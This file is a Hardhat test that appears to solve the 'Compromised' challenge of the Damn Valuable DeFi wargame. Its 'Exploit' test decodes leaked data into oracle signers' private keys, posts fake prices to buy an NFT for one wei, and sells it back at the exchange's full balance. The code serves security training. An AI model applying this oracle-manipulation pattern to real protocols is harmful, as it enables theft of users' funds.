import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, upgrades } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";


describe("Compromised Test", function () {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;

    const sources = [
        "0xA73209FB1a42495120166736362A1DfA9F95A105",
        "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
        "0x81A5D6E50C214044bE44cA0CB057fe119097850c"
    ]

    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther("9990");
    const INITIAL_NFT_PRICE = ethers.utils.parseEther("999");
    
    
  async function setupFixture() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const ExchangeFactory = await ethers.getContractFactory("Exchange");
    const DamnValuableNFTFactory = await ethers.getContractFactory("DamnValuableNFT");
    const TrustfulOracleFactory = await ethers.getContractFactory("TrustfulOracle");
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory("TrustfulOracleInitializer");

    for (let i = 0; i < sources.length; i++) {
        await ethers.provider.send("hardhat_setBalance", [
            sources[i],
            "0x1bc16d674ec80000", // 2 ETH
        ]);
    }

    await ethers.provider.send("hardhat_setBalance", [
        attacker.address,
        "0x16345785d8a0000", // 0.1 ETH
    ]);
 
    // Deploy the oracle and setup the trusted sources with initial prices
    const oracle = TrustfulOracleFactory.attach(
        await (await TrustfulOracleInitializerFactory.deploy(
            sources,
            ["DVNFT", "DVNFT", "DVNFT"],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )).oracle()
    );

    // Deploy the exchange and get the associated ERC721 token
    const exchange = await ExchangeFactory.deploy(
        oracle.address,
        { value: EXCHANGE_INITIAL_ETH_BALANCE }
    );
    const nftToken = DamnValuableNFTFactory.attach(await exchange.token());
    
    return {exchange, nftToken, oracle};
    
  }
    it("Deployment", async function () {
        await loadFixture(setupFixture);
        for(let i = 0; i < sources.length; i++) {
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
    });

    it("Exploit", async function () {
        const {exchange, nftToken, oracle} = await loadFixture(setupFixture);
        const firstData = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        const secondData = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

        const firstDataASCII = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5";
        const secondDataASCII = "MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4";

        const firstDataDecodedBase64 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const secondDataDecodedBase64 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

        const source1 = new ethers.Wallet(firstDataDecodedBase64, ethers.provider);
        const source2 = new ethers.Wallet(secondDataDecodedBase64, ethers.provider);

        expect(await ethers.provider.getBalance(source1.address)).to.eq(ethers.utils.parseEther("2"));
        expect(await ethers.provider.getBalance(source2.address)).to.eq(ethers.utils.parseEther("2"));


        expect(source1.address).to.eq("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");

        await oracle.connect(source1).postPrice("DVNFT", 1);
        await oracle.connect(source2).postPrice("DVNFT", 1);
        
        expect(await oracle.getMedianPrice("DVNFT")).to.eq("1");

        const tokenId = await exchange.connect(attacker).callStatic.buyOne({value:1});
        await exchange.connect(attacker).buyOne({value:1});
        expect(await nftToken.balanceOf(attacker.address)).to.eq("1");

        await oracle.connect(source1).postPrice("DVNFT", ethers.utils.parseEther("9990").add("1"));
        await oracle.connect(source2).postPrice("DVNFT", ethers.utils.parseEther("9990").add("1"));

        await nftToken.connect(attacker).approve(exchange.address, tokenId);
        await exchange.connect(attacker).sellOne(tokenId);

        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);

        /** SUCCESS CONDITIONS */
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
  });
